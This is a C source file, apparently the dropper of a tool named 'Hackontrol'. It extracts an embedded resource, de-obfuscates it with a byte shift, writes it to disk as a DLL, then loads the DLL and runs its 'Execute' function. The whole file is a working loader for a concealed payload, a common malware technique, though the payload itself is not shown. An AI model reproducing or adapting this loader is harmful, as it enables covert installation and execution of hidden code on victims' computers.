#include <stdio.h>
#include <khopanwin32.h>
#include <khopanstring.h>
#include <hackontrol.h>
#include "resource.h"

#define FREE(x) if(LocalFree(x)) KHWin32ConsoleErrorW(GetLastError(), L"LocalFree")

#define FUNCTION_LIBDLL32 "Execute"

typedef void(__stdcall* Rundll32Function) (HWND window, HINSTANCE instance, LPSTR argument, int command);

int main(int argc, char** argv) {
	printf("Finding resource\n");
	HRSRC resourceHandle = FindResourceW(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);

	if(!resourceHandle) {
		KHWin32ConsoleErrorW(GetLastError(), L"FindResourceW");
		return 1;
	}

	DWORD resourceSize = SizeofResource(NULL, resourceHandle);

	if(!resourceSize) {
		KHWin32ConsoleErrorW(GetLastError(), L"SizeofResource");
		return 1;
	}

	printf("Resource size: %lu byte(s)\nLoading resource\n", resourceSize);
	HGLOBAL resource = LoadResource(NULL, resourceHandle);

	if(!resource) {
		KHWin32ConsoleErrorW(GetLastError(), L"LoadResource");
		return 1;
	}

	BYTE* data = LockResource(resource);

	if(!data) {
		KHWin32ConsoleErrorW(GetLastError(), L"LockResource");
		return 1;
	}

	BYTE* buffer = LocalAlloc(LMEM_FIXED, resourceSize);

	if(!buffer) {
		KHWin32ConsoleErrorW(GetLastError(), L"LocalAlloc");
		return 1;
	}

	printf("Allocate memory: %lu byte(s)\n", resourceSize);

	for(DWORD i = 0; i < resourceSize; i++) {
		buffer[i] = (data[i] - 18) % 0xFF;
	}

	LPWSTR pathFolderHackontrol = GetHackontrolDirectory();

	if(!pathFolderHackontrol) {
		KHWin32ConsoleErrorW(GetLastError(), L"GetHackontrolDirectory");
		FREE(buffer);
		return 1;
	}

	LPWSTR pathFileLibdll32 = KHFormatMessageW(L"%ws\\" FILE_LIBDLL32, pathFolderHackontrol);
	FREE(pathFolderHackontrol);

	if(!pathFileLibdll32) {
		KHWin32ConsoleErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		FREE(buffer);
		return 1;
	}

	printf("DLL: %ws\nCreate file\n", pathFileLibdll32);
	HANDLE file = CreateFileW(pathFileLibdll32, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if(file == INVALID_HANDLE_VALUE) {
		KHWin32ConsoleErrorW(GetLastError(), L"CreateFileW");
		FREE(pathFileLibdll32);
		FREE(buffer);
		return 1;
	}

	DWORD written = 0;
	BOOL result = WriteFile(file, buffer, resourceSize, &written, NULL);
	FREE(buffer);
	
	if(!result) {
		KHWin32ConsoleErrorW(GetLastError(), L"WriteFile");
		FREE(pathFileLibdll32);
		return 1;
	}

	printf("Size:    %lu byte(s)\nWritten: %lu byte(s)\n", resourceSize, written);

	if(resourceSize != written) {
		KHWin32ConsoleErrorW(ERROR_FUNCTION_FAILED, L"WriteFile");
		FREE(pathFileLibdll32);
		return 1;
	}

	if(!CloseHandle(file)) {
		KHWin32ConsoleErrorW(GetLastError(), L"CloseHandle");
		FREE(pathFileLibdll32);
		return 1;
	}

	printf("File closed\nLoading DLL\n");
	HMODULE module = LoadLibraryW(pathFileLibdll32);
	FREE(pathFileLibdll32);

	if(!module) {
		KHWin32ConsoleErrorW(GetLastError(), L"LoadLibraryW");
		return 1;
	}

	Rundll32Function function = (Rundll32Function) GetProcAddress(module, FUNCTION_LIBDLL32);

	if(!function) {
		KHWin32ConsoleErrorW(GetLastError(), L"GetProcAddress");
		goto freeLibrary;
	}

	function(NULL, NULL, NULL, 0);
	printf("Finished\n");
freeLibrary:
	if(!FreeLibrary(module)) {
		KHWin32ConsoleErrorW(GetLastError(), L"FreeLibrary");
		return 1;
	}

	return 0;
}
